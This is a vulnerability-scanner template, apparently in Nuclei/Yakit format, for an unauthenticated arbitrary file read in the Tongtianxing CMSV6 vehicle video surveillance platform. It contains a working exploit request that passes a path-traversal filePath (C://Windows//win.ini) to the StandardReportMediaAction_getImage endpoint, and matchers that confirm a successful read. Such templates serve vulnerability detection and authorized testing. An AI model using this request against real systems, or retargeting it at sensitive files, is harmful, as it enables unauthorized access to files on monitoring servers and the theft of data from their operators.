content:
id: tongtianxing-cmsv6-StandardReportMediaAction_getImage-fileread

info:
  name: 通天星CMSV6 StandardReportMediaAction_getImage fileread
  author: hyy
  severity: high
  description: |
    通天星CMSV6车载视频监控平台 StandardReportMediaAction_getImage存在任意文件读取漏洞
  reference:
    - Internal Research
    - CNVD/0day Vulnerability Analysis
  tags: web,fileread,lfi,unauth,cmsv6,gps

requests:
  - method: GET
    path:
      - "{{BaseURL}}/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=0&fileSize=1024"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: '1'

    # 匹配响应中是否包含典型的 win.ini 内容
    matchers:
      - type: word
        words:
          - "fonts"
          - "extensions"
          - "files"
          - "for 16-bit"
        part: body
        condition: and

      - type: status
        status:
          - 200

# 所有 matcher 必须同时满足
    matchers-condition: and
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
